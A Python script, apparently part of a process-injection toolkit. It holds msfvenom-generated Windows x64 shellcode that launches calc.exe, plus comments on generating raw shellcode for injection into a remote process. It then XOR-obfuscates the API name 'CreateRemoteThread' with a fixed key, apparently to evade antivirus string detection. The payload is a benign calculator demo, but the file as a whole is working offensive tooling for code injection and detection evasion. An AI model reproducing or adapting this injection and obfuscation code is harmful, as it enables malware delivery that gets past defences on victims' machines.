
# msfvenom -p windows/x64/exec CMD="cmd.exe /C calc.exe" EXITFUNC=thread
# --platform windows -a x64 -b "\x00\x0a\x0d" -e <any invalid encoder> -f py -v buf
# Invalid encoder will force msfvenom to generate a raw shellcode before formating it in pytho style
# The raw shellcode is smaller and reduce the risk of memory access violation when injected in the remote process

buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
buf += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
buf += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
buf += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
buf += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
buf += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48"
buf += b"\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d"
buf += b"\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
buf += b"\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
buf += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
buf += b"\xda\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f"
buf += b"\x43\x20\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

buf = b"CreateRemoteThread"
key = b"shellcodefacile"
xored_string = list()

buf_length = len(buf)
key_length = len(key)

print("key: {" +",".join(["0x{:02x}".format(key[i]) for i in range(key_length)])+"}, size: "+ str(key_length))
print("data: {" +",".join(["0x{:02x}".format(buf[i]) for i in range(buf_length)])+"}, size: "+ str(buf_length))

for i in range(buf_length):
    k = key[i % key_length]
    xored_string.append("0x{:02x}".format(buf[i] ^ k))

print("xored: {"+",".join(xored_string)+"}")

# with open("calc.xor", "wb") as f:
#     f.write(bytes("\\"+"\\".join(xored_string), "utf-8"))
